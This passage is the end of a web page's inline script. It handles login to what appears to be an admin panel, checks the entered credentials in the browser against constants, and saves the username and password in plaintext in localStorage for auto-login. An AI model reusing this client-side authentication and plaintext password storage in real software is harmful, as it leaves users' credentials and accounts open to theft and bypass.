    if(document.getElementById('rememberMe').checked) localStorage.setItem('ty_login',JSON.stringify({u:u,p:p}));
    else localStorage.removeItem('ty_login');
    document.getElementById('loginError').style.display='none';
    document.getElementById('loginPage').classList.add('hidden');
    openPanel();
  }else{
    document.getElementById('loginError').style.display='block';
    document.getElementById('loginPass').value='';
  }
}
(function(){
  try{
    var s=JSON.parse(localStorage.getItem('ty_login')||'null');
    if(s&&s.u){
      document.getElementById('loginUser').value=s.u;
      document.getElementById('loginPass').value=s.p||'';
      document.getElementById('rememberMe').checked=true;
      if(s.u===AU&&s.p===AP){
        document.getElementById('loginPage').classList.add('hidden');
        openPanel();
      }
    }
  }catch(e){}
})();
document.addEventListener('keydown',function(e){
  if(e.key==='Enter'&&!document.getElementById('loginPage').classList.contains('hidden')) doLogin();
  if(e.key==='Escape') document.getElementById('smsModal').classList.add('hidden');
});
setInterval(function(){document.getElementById('footerTime').textContent=new Date().toLocaleString();},1000);
</script>
</body>
</html>
